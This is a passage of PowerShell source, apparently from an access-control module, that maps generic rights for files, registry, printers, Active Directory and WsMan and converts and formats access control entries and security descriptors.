        ExtendedRight     = 0x000100,
        Delete            = 0x010000,
        ReadPermissions   = 0x020000,
        ChangePermissions = 0x040000,
        TakeOwnership     = 0x080000,
        Synchronize       = 0x100000,
        //Read              = ListChildren | ReadProperty | ListObject | ReadPermissions,
        //Write             = Self | WriteProperty | ReadPermissions,
        //Execute           = ListChildren | ReadPermissions,
        FullControl       = CreateChild | DeleteChild | ListChildren | Self | ReadProperty | WriteProperty | DeleteSubtree | ListContents | ExtendedRight | Delete | ReadPermissions | ChangePermissions | TakeOwnership
    }

    [Flags]
    public enum AppliesTo {
        Object = 1,
        ChildContainers = 2,
        ChildObjects = 4
    }

    namespace NonAccessMaskEnums {
        [Flags]
        public enum SystemMandatoryLabelMask {
            NoWriteUp = 1,
            NoReadUp = 2,
            NoExecuteUp = 4
        }
    }
}
"@

$FileSystemGenericMapping = New-Object -TypeName PowerShellAccessControl.PInvoke.GenericMapping
$FileSystemGenericMapping.GenericRead    = [Security.AccessControl.FileSystemRights] 'Read, Synchronize'
$FileSystemGenericMapping.GenericWrite   = [Security.AccessControl.FileSystemRights] 'Write, ReadPermissions, Synchronize'
$FileSystemGenericMapping.GenericExecute = [Security.AccessControl.FileSystemRights] 'ExecuteFile, ReadAttributes, ReadPermissions, Synchronize'
$FileSystemGenericMapping.GenericAll     = [Security.AccessControl.FileSystemRights] 'FullControl'

$RegistryGenericMapping = New-Object -TypeName PowerShellAccessControl.PInvoke.GenericMapping
$RegistryGenericMapping.GenericRead    = [Security.AccessControl.RegistryRights] 'ReadKey'
$RegistryGenericMapping.GenericWrite   = [Security.AccessControl.RegistryRights] 'WriteKey'
$RegistryGenericMapping.GenericExecute = [Security.AccessControl.RegistryRights] 'CreateLink, ReadKey'
$RegistryGenericMapping.GenericAll     = [Security.AccessControl.RegistryRights] 'FullControl'

$PrinterGenericMapping = New-Object -TypeName PowerShellAccessControl.PInvoke.GenericMapping
$PrinterGenericMapping.GenericRead    = [PowerShellAccessControl.PrinterRights] 'ExecutePrinter'
$PrinterGenericMapping.GenericWrite   = [PowerShellAccessControl.PrinterRights] 'ExecutePrinter'
$PrinterGenericMapping.GenericExecute = [PowerShellAccessControl.PrinterRights] 'ExecutePrinter'
$PrinterGenericMapping.GenericAll     = [PowerShellAccessControl.PrinterRights] 'PrinterAllAccess'

$AdGenericMapping = New-Object -TypeName PowerShellAccessControl.PInvoke.GenericMapping
$AdGenericMapping.GenericRead    = [PowerShellAccessControl.ActiveDirectoryRights] 'ListChildren, ReadProperty, ListContents, ReadPermissions'
$AdGenericMapping.GenericWrite   = [PowerShellAccessControl.ActiveDirectoryRights] 'Self, WriteProperty, ReadPermissions'
$AdGenericMapping.GenericExecute = [PowerShellAccessControl.ActiveDirectoryRights] 'ListChildren, ReadPermissions'
$AdGenericMapping.GenericAll     = [PowerShellAccessControl.ActiveDirectoryRights] 'CreateChild, DeleteChild, ListChildren, Self, ReadProperty, WriteProperty, DeleteSubtree, ListContents, ExtendedRight, Delete, ReadPermissions, ChangePermissions, TakeOwnership'

$WsManMapping = New-Object -TypeName PowerShellAccessControl.PInvoke.GenericMapping
$WsManMapping.GenericRead = [PowerShellAccessControl.WsManAccessRights]::Read
$WsManMapping.GenericWrite = [PowerShellAccessControl.WsManAccessRights]::Write
$WsManMapping.GenericExecute = [PowerShellAccessControl.WsManAccessRights]::Execute
$WsManMapping.GenericAll = [PowerShellAccessControl.WsManAccessRights]::Full

$__GenericRightsMapping = @{
    [PowerShellAccessControl.PrinterRights]          = $PrinterGenericMapping
    [Security.AccessControl.RegistryRights]   = $RegistryGenericMapping
    [Security.AccessControl.FileSystemRights] = $FileSystemGenericMapping
    [PowerShellAccessControl.ActiveDirectoryRights]  = $AdGenericMapping
    [PowerShellAccessControl.WsManAccessRights] = $WsManMapping
}

function Get-CimInstanceFromPath {
  <#
      .SYNOPSIS
      Converts a WMI path into a CimInstance object.
      .DESCRIPTION
      Get-CimInstanceFromPath takes an absolute WMI path and creates a WMI query that
      Get-CimInstance takes as an argument. If everything works properly, a CimInstance
      object will be returned.
      .EXAMPLE
      $Bios = Get-WmiObject Win32_BIOS; Get-CimInstanceFromPath -Path $Bios.__PATH
      .EXAMPLE
      Get-WmiObject Win32_BIOS | Get-CimInstanceFromPath
      .NOTES
      The function currently only works with absolute paths. It can easily be modified
      to work with relative paths, too.
  #>
  <#
      This function allows CIM objects to be represented as a string (like the WMI __PATH property). For example,
      if you pass a CIM object that the module can get a security descriptor for (like a __SystemSecurity instance),
      the SD's path property will include this string so that an instance of the CIM object can be obtained again.

      WMI cmdlets have this functionality built-in:
      $Computer = gwmi Win32_ComputerSystem
      [wmi] $Computer.__PATH    # Get WMI instance from path

      This function was more usefule in v1.x of this module before GetNamedSecurityInfo() and GetSecurityInfo()
      windows APIs were used.
  #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true, ValueFromPipelineByPropertyName=$true, ValueFromPipeline=$true)]
        [Alias('__PATH')]
        # WMI path (Path must be absolute path, not relative path). See __PATH 
        # property on an object returned from Get-WmiObject
        [string] $Path
    )

    process {
        if ($Path -match "^\\\\(?<computername>[^\\]*)\\(?<namespace>[^:]*):(?<classname>[^=\.]*)(?<separator>\.|(=@))(?<keyvaluepairs>.*)?$") {
            $Query = "SELECT * FROM {0}" -f $matches.classname

            switch ($matches.separator) {

                "." {
                    # Key/value pairs are in string, so add a WHERE clause
                    $Query += " WHERE {0}" -f [string]::Join(" AND ", $matches.keyvaluepairs -split ",")
                }
            }

            $GcimParams = @{
                ComputerName = $matches.computername
                Namespace = $matches.namespace
                Query = $Query
                ErrorAction = "Stop"
            }

        }
        else {
            throw "Path not in expected format!"
        }

        Get-CimInstance @GcimParams
    }
}

function Get-CimPathFromInstance {
  <#
      The opposite of the Get-CimInstanceFromPath. This is how a __PATH property can be computed for a CIM instance.

      Like the other function, this was more useful in 1.x versions of the module. It is still used in the GetWmiObjectInfo
      helper function and the Get-Win32SecurityDescriptor exposed function.
  #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
        [ciminstance] $InputObject
    )

    process {
        $Keys = $InputObject.CimClass.CimClassProperties | 
            Where-Object { $_.Qualifiers.Name -contains "Key" } |
            Select-Object Name, CimType | 
            Sort-Object Name

        $KeyValuePairs = $Keys | ForEach-Object { 

            $KeyName = $_.Name
            switch -regex ($_.CimType) {

                "Boolean|.Int\d+" {
                    # No quotes surrounding value:
                    $Value = $InputObject.$KeyName
                }

                "DateTime" {
                    # Conver to WMI datetime
                    $Value = '"{0}"' -f [System.Management.ManagementDateTimeConverter]::ToDmtfDateTime($InputObject.$KeyName)
                }

                "Reference" {
                    throw "CimInstance contains a key with type 'Reference'. This isn't currenlty supported (but can be added later)"
                }

                default {
                    # Treat it like a string and cross your fingers:
                    $Value = '"{0}"'  -f ($InputObject.$KeyName -replace "`"", "\`"")
                }
            }

            "{0}={1}" -f $KeyName, $Value
        }

        if ($KeyValuePairs) { 
            $KeyValuePairsString = ".{0}" -f ($KeyValuePairs -join ",")
        }
        else {
            # This is how WMI seems to handle paths with no keys
            $KeyValuePairsString = "=@" 
        }

        "\\{0}\{1}:{2}{3}" -f $InputObject.CimSystemProperties.ServerName, 
                               ($InputObject.CimSystemProperties.Namespace -replace "/","\"), 
                               $InputObject.CimSystemProperties.ClassName, 
                               $KeyValuePairsString


    }
}

function Convert-AclToString {
  <#
      Converts an ACL into a string that has been formatted with Format-Table. The AccessToString and
      AuditToString properties on the PSObject returned from Get-SecurityDescriptor use this function.
  #>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$true)]
        $Ace,
        [int] $MaxAces = 20,
        [PowerShellAccessControl.AppliesTo] $DefaultAppliesTo
    )

    begin {

        $TableProperties = @(
            @{ Label = "Type"
               Expression = { 
                   $CurrentAce = $_

                   if ($_.IsInherited) { $ExtraChar = ""}
                   else { $ExtraChar = "*" }

                   $ReturnString = switch ($_.AceType.ToString()) {
                       "AccessAllowed" { ('Allow{0}' -f $ExtraChar) }
                       "AccessDenied" { "Deny$ExtraChar" }
                       "SystemAudit" {
                           $AuditSuccess = $AuditFailure = " "
                           if ($CurrentAce.AuditFlags -band [System.Security.AccessControl.AuditFlags]::Success) {
                               $AuditSuccess = "S"
                           }
                           if ($CurrentAce.AuditFlags -band [System.Security.AccessControl.AuditFlags]::Failure) {
                               $AuditFailure = "F"
                           }

                           "Audit$ExtraChar {0}{1}" -f $AuditSuccess, $AuditFailure
                       }
                       default { $_ }

                   }

                   $ReturnString -join " "
               }
               Width = 9
             }
            @{ Label = "IdentityReference"
               Expression = { 
                   $_.Principal -replace "($env:COMPUTERNAME|BUILTIN|NT AUTHORITY)\\", ""
               }
               Width = 20
             }
            @{ Label = "Rights"
               Expression = { 
                $Display = $_.AccessMaskDisplay -replace "\s\(.*\)$"
                if (($PSBoundParameters.ContainsKey("DefaultAppliesTo") -and ($_.AppliesTo.value__ -ne $DefaultAppliesTo.value__)) -or ($_.OnlyApplyToThisContainer)) {
                    #$Display += " (Special)"
                    $Display = "Special"
                }
                $Display
               }
               Width = 20
             }
        )

        # If the following properties are the same, the ACEs will be grouped together
        $PropertiesToGroupBy = @(
            "AceType"
            "SecurityIdentifier"
            "StringPermissions"  # Modified form of the AccessMaskDisplay property, which is a string representation of the AccessMask (not grouping on that b/c GenericRights would mean that the AccessMasks might not match, while the effecitve rights do)
            "IsInherited"
            "OnlyApplyToThisContainer"
            "AuditFlags"         # Doesn't affect grouping access rights; this is a CommonAce property
            "ObjectAceType"           # Since it will be null if this is an ACE that doesn't contain this property, shouldn't affect grouping of normal non-object ACEs
            "InheritedObjectAceType"  # Since it will be null if this is an ACE that doesn't contain this property, shouldn't affect grouping of normal non-object ACEs
        )

        $CollectedAces = @()
        $ExtraMessage = $null
    }

    process {
        
        $CollectedAces += $Ace

        if ($CollectedAces.Count -ge $MaxAces) { 
            $ExtraMessage = "`n<...>"
            break 
        }

    }

    end {
        $Output = $CollectedAces | Format-Table -Property $TableProperties -HideTableHeaders -Wrap | Out-String | % { $_.Trim() }
        $Output = "{0}{1}" -f $Output, $ExtraMessage

        if (-not $Output) {
            "<ACL INFORMATION NOT PRESENT>"
        }
        else {
            $Output
        }
    }
}

function script:GetAppliesToMapping {
  <#
      ACE inheritance and propagation are handled by the InheritanceFlags and PropagationFlags properties
      on an ACE. Based on the flags enabled, a GUI ACL editor will show you two separate pieces of information 
      about an ACE:
      1. Whether or not it applies to itself, child containers, and/or child objects
      2. Whether or not it applies only to direct children (one level deep) or all descendants (infinite
         depth)

      #1 is handled by both flags enumerations and #2 is only handled by PropagationFlags. This function
      provides a way for determining #1 and #2 if you provide the flags enumerations, and it also provides
      a way to get the proper flags enumerations for #1 if you provide string representations of where you
      would like the ACE to apply.
  #>

    [CmdletBinding(DefaultParameterSetName='FromAppliesTo')]
    param(
        [Parameter(Mandatory=$true, ParameterSetName="FromAppliesTo", Position=0)]
        [PowerShellAccessControl.AppliesTo] $AppliesTo,
        [Parameter(Mandatory=$true, ParameterSetname="ToAppliesTo", ValueFromPipelineByPropertyName=$true)]
        [System.Security.AccessControl.InheritanceFlags] $InheritanceFlags,
        [Parameter(Mandatory=$true, ParameterSetname="ToAppliesTo", ValueFromPipelineByPropertyName=$true)]
        [System.Security.AccessControl.PropagationFlags] $PropagationFlags,
        [Parameter(ParameterSetname="ToAppliesTo")]
        [switch] $CheckForNoPropagateInherit,
        [Parameter(Mandatory=$true, ParameterSetName="ADFromAppliesTo")]
        [PowerShellAccessControl.AppliesTo] $ADAppliesTo,
        [Parameter(ParameterSetName="ADFromAppliesTo")]
        [switch] $OnlyApplyToThisADContainer = $false

    )

    begin {
        $Format = "{0},{1}"
        $AppliesToMapping = @{ # Numeric values from [PowershellAccessControl.AppliesTo] flags enum
            #ThisObjectOnly
            1 = $Format -f [System.Security.AccessControl.InheritanceFlags]::None.value__, [System.Security.AccessControl.PropagationFlags]::None.value__
            #ChildContainersOnly
            2 = $Format -f [System.Security.AccessControl.InheritanceFlags]::ContainerInherit.value__, [System.Security.AccessControl.PropagationFlags]::InheritOnly.value__ 
            #ThisObjectAndChildContainers
            3 = $Format -f [System.Security.AccessControl.InheritanceFlags]::ContainerInherit.value__, [System.Security.AccessControl.PropagationFlags]::None.value__
            #ChildObjectsOnly
            4 = $Format -f [System.Security.AccessControl.InheritanceFlags]::ObjectInherit.value__, [System.Security.AccessControl.PropagationFlags]::InheritOnly.value__
            #ThisObjectAndChildObjects
            5 = $Format -f [System.Security.AccessControl.InheritanceFlags]::ObjectInherit.value__, [System.Security.AccessControl.PropagationFlags]::None.value__
            #ChildContainersAndChildObjectsOnly
            6 = $Format -f ([System.Security.AccessControl.InheritanceFlags] "ContainerInherit, ObjectInherit").value__, [System.Security.AccessControl.PropagationFlags]::InheritOnly.value__ 
            #ThisObjectChildContainersAndChildObjects
            7 = $Format -f ([System.Security.AccessControl.InheritanceFlags] "ContainerInherit, ObjectInherit").value__, [System.Security.AccessControl.PropagationFlags]::None.value__
        }
    }

    process {
        switch ($PSCmdlet.ParameterSetName) {
            "FromAppliesTo" {
                $MappingString = $AppliesToMapping[$AppliesTo.value__]
                if ($MappingString -eq $null) { 
                    Write-Error ("Unable to map AppliesTo value ({0} to inheritance and propagation flags!" -f $AppliesTo) 
                    return
                }
                $Mappings = $MappingString -split ","

                New-Object PSObject -Property @{
                    InheritanceFlags = [System.Security.AccessControl.InheritanceFlags] $Mappings[0]
                    PropagationFlags = [System.Security.AccessControl.PropagationFlags] $Mappings[1]
                }
            }

            "ADFromAppliesTo" {
                $Format = "{0}, {1}"
                $ADAppliesToMapping = @{ # Numeric values from System.DirectoryServices.ActiveDirectorySecurityInheritance
                    # None is the same as [AppliesTo]::Object (doesn't matter if only applies here is set)
                    ($Format -f [PowerShellAccessControl.AppliesTo]::Object.value__, $false) = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
                    ($Format -f [PowerShellAccessControl.AppliesTo]::Object.value__, $true) = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
                    # All is the same as [AppliesTo]::Object, ChildContainers and applies to only this container false
                    ($Format -f ([PowerShellAccessControl.AppliesTo] "Object, ChildContainers").value__, $false) = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::All
                    # SelfAndChildren is the same as [AppliesTo]::Object, ChildContainers and applies to only this container is true
                    ($Format -f ([PowerShellAccessControl.AppliesTo] "Object, ChildContainers").value__, $true) = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::SelfAndChildren
                    # Descendats is the same as [AppliesTo]::ChildContainers and applies to only this container false
                    ($Format -f [PowerShellAccessControl.AppliesTo]::ChildContainers.value__, $false) = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::Descendents
                    # Children is the same as [AppliesTo]::ChildContainers and applies to only this container true
                    ($Format -f [PowerShellAccessControl.AppliesTo]::ChildContainers.value__, $true) = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::Children
                }

                # Get numeric form of AppliesTo (get rid of ChildObjects if it is present)
                $AppliesToInt = $ADAppliesTo.value__ -band ([int32]::MaxValue -bxor [PowerShellAccessControl.AppliesTo]::ChildObjects)

                $AdSecurityInheritance = $ADAppliesToMapping[($Format -f $AppliesToInt, $OnlyApplyToThisADContainer)]

                if ($AdSecurityInheritance -eq $null) {
                    Write-Error ("Unable to convert AppliesTo ($ADAppliesTo) and OnlyApplyToThisContainer ($OnlyApplyToThisADContainer) to ActiveDirectorySecurityInheritance")
                    return
                }
                $AdSecurityInheritance
            }

            "ToAppliesTo" {
                if ($CheckForNoPropagateInherit) {
                    $PropagationFlags = $PropagationFlags.value__

                    # NoPropagateInherit doesn't deal with AppliesTo, so make sure that flags isn't active
                    if ($PropagationFlags -band [System.Security.AccessControl.PropagationFlags]::NoPropagateInherit) {
                        $true
                    }
                    else {
                        $false
                    }

                }
                else {
                    # NoPropagateInherit doesn't deal with AppliesTo, so make sure that flag isn't active
                    if ($PropagationFlags -band [System.Security.AccessControl.PropagationFlags]::NoPropagateInherit) {
                        [System.Security.AccessControl.PropagationFlags] $PropagationFlags = $PropagationFlags -bxor [System.Security.AccessControl.PropagationFlags]::NoPropagateInherit
                    }
                    $MappingString = $Format -f $InheritanceFlags.value__, $PropagationFlags.value__

                    $FlagsValue = $AppliesToMapping.Keys | where { $AppliesToMapping.$_ -eq $MappingString }
                    [PowerShellAccessControl.AppliesTo] $FlagsValue
                }
            }
        }
    }

}

function script:ConvertToSpecificAce {
  <#
      This function will take a CommonAce or ObjectAce and convert it into a .NET ACE that can be used
      with security descriptors for Files, Folders, Registry keys, and AD objects. At some point, this
      will probably be merged with ConvertToCommonAce to have a single function that looks at any type
      of ACE coming in, and converts it to the right type based on the $AclType.

      This function allows Add-AccessControlEntry and Remove-AccessControlEntry to work with SDs from
      the native Get-Acl cmdlet.
  #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)]
        $Rules,
        [Parameter(Mandatory=$true)]
        # The type of the ACL that this ACE will belong to.
        [type] $AclType
    )

    begin {
        # Figure out what the final type of the rule should be. This depends on
        # the $AclType, and (if the ACL type is a CommonSecurityDescriptor), the
        # ACE itself

        if ($AclType.FullName -match "^(System\.Security\.AccessControl\.|System\.DirectoryServices\.)(\w+?)Security$") {
            # If its a File/DirectorySecurity create a FileSystemAccessRule (or Audit); otherwise, match can be used
            # as found (Registry or ActiveDirectory are all that I know of that will match this and work with New-Ace).
            $AclRuleKind = "{0}{1}{{0}}Rule" -f $Matches[1], ($Matches[2] -replace "^File|^Directory", "FileSystem")
            $AccessMaskParamName = $Matches[2] -replace "^Directory", "Folder"

            # This will leave a string with a {0} where Access or Audit will go later
        }
        elseif ($AclType.FullName -eq "System.Security.AccessControl.CommonSecurityDescriptor") {
      # This isn't suppported until a future release:
      throw ("{0} ACLs aren't supported" -f $AclType.FullName)
            # Final rule will need to either be a CommonAce or an ObjectAce (rules aren't different
            # b/w Access and Audit rules)

            # ObjectAce if .ObjectAceFlags exists and has flags other than 'None'
            # This is a design decision that may change. For non-AD ACEs, this is easy: .ObjectAceFlags
            # won't exist, so they will be converted to CommonAce objects (if they're not already). For
            # AD ACEs, though, either type is fine. ActiveDirectorySecurity objects always have .ObjectAceFlags
            # properties, even if the property is set to 'None'. This function would take one of those and
            # only output an ObjectAce if an ObjectAceType or InheritedObjectAceType were set.

            # Since more than one ACE can come through at once, this check is performed in the foreach()
            # section in the process block.
        }
        else {
            throw "Unknown ACL type ($($AclType.FullName))"
        }
    }

    process {

        foreach ($Rule in $Rules) {
            # See note in begin block for an explanation of this check:
            if ($AclType.Name -eq "CommonSecurityDescriptor") {
                if ($Rule.ObjectAceFlags -and $Rule.ObjectAceFlags -ne "None") {
                    $AclRuleKind = "System.Security.AccessControl.ObjectAce"
                }
                else {
                    $AclRuleKind = "System.Security.AccessControl.CommonAce"
                }
            }

            if ($Rule.AuditFlags -and $Rule.AuditFlags -ne [System.Security.AccessControl.AuditFlags]::None) {
                # This must be an audit rule
                $AuditOrAccess = "Audit"
            }
            else {
                # This must be an access rule
                $AuditOrAccess = "Access"
            }
            $CurrentRuleKind = $AclRuleKind -f $AuditOrAccess


            # Check to see if it's already the right type of rule
            if ($Rule.GetType().FullName -eq $CurrentRuleKind) {
                Write-Debug ("{0}: Rule already $CurrentRuleKind; no need to convert" -f $MyInvocation.InvocationName)
                $Rule
                continue
            }

            Write-Debug ("{0}: Rule is currently {1}; needs to be converted to {2}" -f $MyInvocation.InvocationName, $Rule.GetType().FullName, $CurrentRuleKind)

            # Make sure this is a known AceType (also, strip away 'Object' if it is at the end
            # of the type)
            if ($Rule.AceType -notmatch "^(\w+?)(Object)?$") {
                throw "Unknown ACE type ($($Rule.AceType))"
            }

            $CurrentAceType = $Matches[1]
            $NewAceParams = @{
                AceType = $CurrentAceType
                Principal = $Rule.SecurityIdentifier
                $AccessMaskParamName = $Rule.AccessMask
                AppliesTo = $Rule | GetAppliesToMapping
                OnlyApplyToThisContainer = $Rule | GetAppliesToMapping -CheckForNoPropagateInherit
            }

            if ($Rule.ObjectAceType) {
                $NewAceParams.ObjectAceType = $Rule.ObjectAceType
            }

            if ($Rule.InheritedObjectAceType) {
                $NewAceParams.InheritedObjectAceType = $Rule.InheritedObjectAceType
            }

            if ($AuditOrAccess -eq "Audit") {
                # Convert flags to string, split on comma, trim trailing or leading spaces, and
                # create a boolean value to simulate [switch] statement for splatting:
                $Rule.AuditFlags.ToString() -split "," | ForEach-Object {
                    $NewAceParams.$("Audit{0}" -f $_.Trim()) = $true
                }
            }

            New-AccessControlEntry @NewAceParams -ErrorAction Stop
        }
    }
}

function script:ConvertToCommonAce {
  <#
      When dealing with the underlying CommonSecurityDescriptor object, ACEs need to be
      CommonAce or ObjectAce types. This function takes lots of different types of ACEs
      and converts them to ACEs that can be used by the CommonSecurityDescripor objects.

      This allows the module to work with file system rules, registry rules, Win32_ACE rules,
      etc.
  #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)]
        [AllowNull()]
        [object[]] $Rules, # Allow any object to come through since we can accept different ACE types
        # By default, this will create an ACE that was not inherited, even if an inherited ACE is
        # passed to it. This switch will keep that (might actually flip the behavior at some point)
        #
        # One more thing: this won't do anything for a file or registry ACE, only an ACE from a
        # Win32SD or from an ACE in a RawAcl object
        [switch] $KeepInheritedFlag
    )

    process {
        foreach ($Rule in $Rules) {
            if ($Rule -eq $null) { continue }  # PSv2 iterates once if $Rules is null

            # We work with System.Security.AccessControl.CommonAce objects, so make sure whatever came in
            # is one of those, or can be converted to one:
            Write-Debug "$($MyInvocation.MyCommand): Type of rule is '$($Rule.GetType().FullName)'"
            switch ($Rule.GetType().FullName) {

                { $Rule.pstypenames -contains $__AdaptedAceTypeName } {

                    $IsRuleInherited = $Rule.IsInherited

                    # This is an ace created by the module; anything with this typename should be able to be
                    # piped directly to New-AccessControlEntry
                    # Note: Valid types should be CommonAce or ObjectAce

                    # Make the rule:
                    Write-Debug "$($MyInvocation.MyCommand): Rule is adapted type; running original back through New-AccessControlEntry"
                    $Rule = $Rule | New-AccessControlEntry
                    break
                }

                { "System.Security.AccessControl.CommonAce", "System.Security.AccessControl.ObjectAce" -contains $_ } {
                    # Get a copy of the rule (we don't want to touch the original object)
                    Write-Debug "$($MyInvocation.MyCommand): No conversion necessary"
                    $Rule = $Rule.Copy()
                    $IsRuleInherited = [bool] ([int] $Rule.AceFlags -band [System.Security.AccessControl.AceFlags]::Inherited.value__)
                    break
                }

                { $_ -eq "System.Security.AccessControl.FileSystemAccessRule" -or 
                    $_ -eq "System.Security.AccessControl.RegistryAccessRule" -or
                  $_ -eq "System.DirectoryServices.ActiveDirectoryAccessRule" } {

                    # File system access rule or registry access rule

                    $IsRuleInherited = $Rule.IsInherited

                    if ($Rule.AccessControlType -eq [System.Security.AccessControl.AccessControlType]::Allow) {
                        $AceQualifier = [System.Security.AccessControl.AceQualifier]::AccessAllowed
                    }
                    else {
                        $AceQualifier = [System.Security.AccessControl.AceQualifier]::AccessDenied
                    }

                    $Params = @{
                        AceType = $AceQualifier
                        Principal = $Rule.IdentityReference
                        AppliesTo = $Rule | GetAppliesToMapping
                        OnlyApplyToThisContainer = $Rule | GetAppliesToMapping -CheckForNoPropagateInherit
                        GenericAce = $true
                    }

                    if ($_ -eq "System.Security.AccessControl.FileSystemAccessRule") {
                        $Params.FileRights = $Rule.FileSystemRights
                    }
                    elseif ($_ -eq "System.Security.AccessControl.RegistryAccessRule") {
                        $Params.RegistryRights = $Rule.RegistryRights
                    }
                    else {
                        # AD access rule
                        $Params.ActiveDirectoryRights = [int] $Rule.ActiveDirectoryRights
                        $Params.ObjectAceType = $Rule.ObjectType
                        $Params.InheritedObjectAceType = $Rule.InheritedObjectType
                    }

                    # Make the rule:
                    Write-Debug "$($MyInvocation.MyCommand): Calling New-AccessControlEntry to create CommonAce from access rule"
                    $Rule = New-AccessControlEntry @Params
                    break
                }

                { $_ -eq "System.Security.AccessControl.FileSystemAuditRule" -or 
                    $_ -eq "System.Security.AccessControl.RegistryAuditRule" -or 
                  $_ -eq "System.DirectoryServices.ActiveDirectoryAuditRule" } {

                    # File system or registry audit

                    $IsRuleInherited = $Rule.IsInherited

                    $Params = @{
                        Principal = $Rule.IdentityReference
                        AppliesTo = $Rule | GetAppliesToMapping
                        OnlyApplyToThisContainer = $Rule | GetAppliesToMapping -CheckForNoPropagateInherit
                        GenericAce = $true
                        AceType = [System.Security.AccessControl.AceQualifier]::SystemAudit
                        AuditSuccess = [bool] ($Rule.AuditFlags -band [System.Security.AccessControl.AuditFlags]::Success)
                        AuditFailure = [bool] ($Rule.AuditFlags -band [System.Security.AccessControl.AuditFlags]::Failure)
                    }

                    if ($_ -eq "System.Security.AccessControl.FileSystemAuditRule") {
                        $Params.FileSystemRights = $Rule.FileSystemRights
                    }
                    elseif ($_ -eq "System.Security.AccessControl.RegistryAuditRule") {
                        $Params.RegistryRights = $Rule.RegistryRights
                    }
                    else {
                        # AD audit rule
                        $Params.ActiveDirectoryRights = [int] $Rule.ActiveDirectoryRights
                        $Params.ObjectAceType = $Rule.ObjectType
                        $Params.InheritedObjectAceType = $Rule.InheritedObjectType
                    }

                    # Make the rule:
                    Write-Debug "$($MyInvocation.MyCommand): Calling New-AccessControlEntry to create CommonAce from audit rule"
                    $Rule = New-AccessControlEntry @Params
                    break
                }

                { ($_ -eq "System.Management.ManagementBaseObject" -and
                   ($Rule.__CLASS -eq "Win32_ACE") -or ($Rule.__CLASS -eq "__ACE")) -or 
                  ($_ -eq "Microsoft.Management.Infrastructure.CimInstance" -and
                   ($Rule.CimClass.CimClassName -eq "Win32_ACE") -or ($Rule.CimClass.CimClassName -eq "__ACE")) } {

                    $IsRuleInherited = [bool] ([int] $Rule.AceFlags -band [System.Security.AccessControl.AceFlags]::Inherited.value__)

                    # Long and scary looking condition, but it just means do the
                    # following if it's a WMI object of the Win32_ACE class
                    
                    $Principal = ([System.Security.Principal.SecurityIdentifier] $Rule.Trustee.SIDString)

                    if ($Rule.AccessMask.GetType().FullName -eq "System.UInt32") {
                        # I've seen file access rights with UInts; convert them to signed ints:
                        $AccessMask = [System.BitConverter]::ToInt32([System.BitConverter]::GetBytes($Rule.AccessMask), 0)
                    }
                    else {
                        $AccessMask = $Rule.AccessMask
                    }

                    # Common params b/w access and audit ACEs:
                    $Params = @{
                        Principal = $Principal
                        AccessMask = $AccessMask
                        AceFlags = $Rule.AceFlags
                        AceType = [System.Security.AccessControl.AceType] $Rule.AceType
                    }

                    if ($Rule.AceType -eq [System.Security.AccessControl.AceQualifier]::SystemAudit) {
                        # Not an access entry, but an audit entry
                        $Params.AuditSuccess = [bool] ([int] $Rule.AceFlags -band [System.Security.AccessControl.AceFlags]::SuccessfulAccess.value__)
                        $Params.AuditFailure = [bool] ([int] $Rule.AceFlags -band [System.Security.AccessControl.AceFlags]::FailedAccess.value__)
                    }

                    # Make the rule:
                    Write-Debug "$($MyInvocation.MyCommand): Calling New-AccessControlEntry to create CommonAce from Win32_ACE"
                    $Rule = New-AccessControlEntry @Params
                    break

                }
                                    
                default {
                    Write-Error "Unknown access rule type!"
                    return
                }
            }

            if (-not $KeepInheritedFlag) {
                # There is a possibility that the ACE that came through
                # this function was inherited. If this function is being used,
                # it's usually to add or remove an ACE. In either of those 
                # scenarios, you don't want the resulting ACE to still be
                # inherited, so remove that flag if it's present
                if ([int] $Rule.AceFlags -band [System.Security.AccessControl.AceFlags]::Inherited.value__) {
                    $Rule.AceFlags = [int] $Rule.AceFlags -bxor [System.Security.AccessControl.AceFlags]::Inherited.value__
                }
            }
            else {
                if ($IsRuleInherited -and (-not ([int] $Rule.AceFlags -band [System.Security.AccessControl.AceFlags]::Inherited.value__))) {
                    # If the original rule was inherited, but the converted one isn't, fix it!
                    $Rule.AceFlags = [int] $Rule.AceFlags -bxor [System.Security.AccessControl.AceFlags]::Inherited.value__
                }
            }

            # Output the rule:
            $Rule
        }
    }
}

function script:GetSecurityInfo {
  <#
      Wraps the PInvoke signature for GetNamedSecurityInfo and GetSecurityInfo. Path validation is up
      to the caller (but this function should return a meaningful error message if an error is encountered)

  #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true, Position=0, ParameterSetName="Named")]
        [string] $Path,
        [Parameter(Mandatory=$true, Position=0, ParameterSetName="NotNamed")]
        [IntPtr] $Handle,
        [Parameter(Mandatory=$true)]
        [System.Security.AccessControl.ResourceType] $ObjectType,
        [PowerShellAccessControl.PInvoke.SecurityInformation] $SecurityInformation = "Owner, Group, Dacl"
    )

    # Initialize pointers for the different sections (the only pointer we'll use is the one
    # to the entire SecurityDescriptor (it will work even if all sections weren't requested):
    $pOwner = $pGroup = $pDacl = $pSacl = $pSecurityDescriptor = [System.IntPtr]::Zero

    # Function and arguments are slightly different depending on param set:
    if ($PSCmdlet.ParameterSetName -eq "Named") {
        $FunctionName = "GetNamedSecurityInfo"
        $FirstArgument = $Path
    }
    else {
        $FunctionName = "GetSecurityInfo"
        $FirstArgument = $Handle
    }


    Write-Debug "$($MyInvocation.MyCommand): Getting security descriptor for '$FirstArgument' ($ObjectType) with the following sections: $SecurityInformation"

    if ($SecurityInformation -band [PowerShellAccessControl.PInvoke.SecurityInformation]::Sacl) {
        # Make sure SeSecurityPrivilege is enabled, since this is required to view/modify
        # the SACL
        $AdjustPrivResults = SetTokenPrivilege -Privilege SeSecurityPrivilege
    }

    try {
        # Put arguments in array b/c PSv2 seems to require it to do the Invoke() call below (I didn't look
        # into it too much, but it was definitely erroring out when I had them in directly in the method
        # call):
        $Arguments = @(
            $FirstArgument,
            $ObjectType,
            $SecurityInformation,
            [ref] $pOwner, 
